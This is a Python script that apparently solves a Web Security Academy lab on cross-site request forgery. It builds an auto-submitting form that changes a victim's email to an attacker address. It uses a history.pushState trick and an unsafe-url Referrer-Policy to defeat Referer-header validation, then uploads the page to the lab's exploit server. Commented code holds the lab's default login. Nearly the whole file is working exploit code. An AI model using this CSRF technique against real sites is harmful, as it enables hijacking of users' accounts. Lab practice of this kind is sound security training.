import requests
from bs4 import BeautifulSoup

site = 'ac081faf1e2e0569c030214000ee00d6.web-security-academy.net'
s = requests.session()

def storeExploit():
    url = f'https://{site}/'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')
    referer_url = f'{url}/my-account/change-email'
    exploit_html = f'''<html>
      <body>
      <form action="https://{site}/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="pwned@evil-user.net" />
      </form>
      <script>
        document.forms[0].submit();
        history.pushState("", "", "/?{referer_url}");
      </script>
      </body>
    </html>'''

    formData = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nReferrer-Policy: unsafe-url',
        'responseBody': exploit_html,
        'formAction': 'STORE'
    }
    resp = s.post(exploit_url, data=formData)


if __name__ == "__main__":
    storeExploit()
    # login_url = f'https://{site}/login'
    # logindata = {
    #     'username': 'wiener',
    #     'password': 'peter'
    # }
    # resp = requests.post(login_url, data=logindata, headers={'referer': f"'{site}'"})
    # print(f'HTTP status code: {resp.status_code} with response text {resp.text}')
